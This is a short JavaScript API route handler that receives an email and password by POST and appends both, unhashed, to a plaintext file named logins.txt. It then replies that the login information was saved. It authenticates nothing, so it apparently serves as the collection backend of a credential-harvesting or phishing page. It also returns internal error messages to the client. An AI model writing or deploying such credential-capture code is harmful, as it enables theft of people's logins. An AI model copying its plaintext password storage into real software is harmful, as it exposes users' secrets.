const fs = require('fs').promises;
const path = require('path');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const { email, pass: password } = req.body;

            // Sanitize input
            const sanitizedEmail = email.replace(/[^a-zA-Z0-9@.]/g, '');
            const sanitizedPassword = password.replace(/[^a-zA-Z0-9]/g, '');

            // Create a string to write to the file
            const logEntry = `Email: ${sanitizedEmail} - Password: ${sanitizedPassword}\n`;

            // Define the file path
            const filePath = path.join(process.cwd(), 'logins.txt');

            // Write the log entry to the file
            await fs.appendFile(filePath, logEntry);

            res.status(200).send('Login information saved successfully!');
        } catch (error) {
            console.error('Error saving login data:', error.message);
            res.status(500).json({ error: 'Internal Server Error', details: error.message });
        }
    } else {
        res.status(405).json({ error: 'Method Not Allowed' });
    }
}
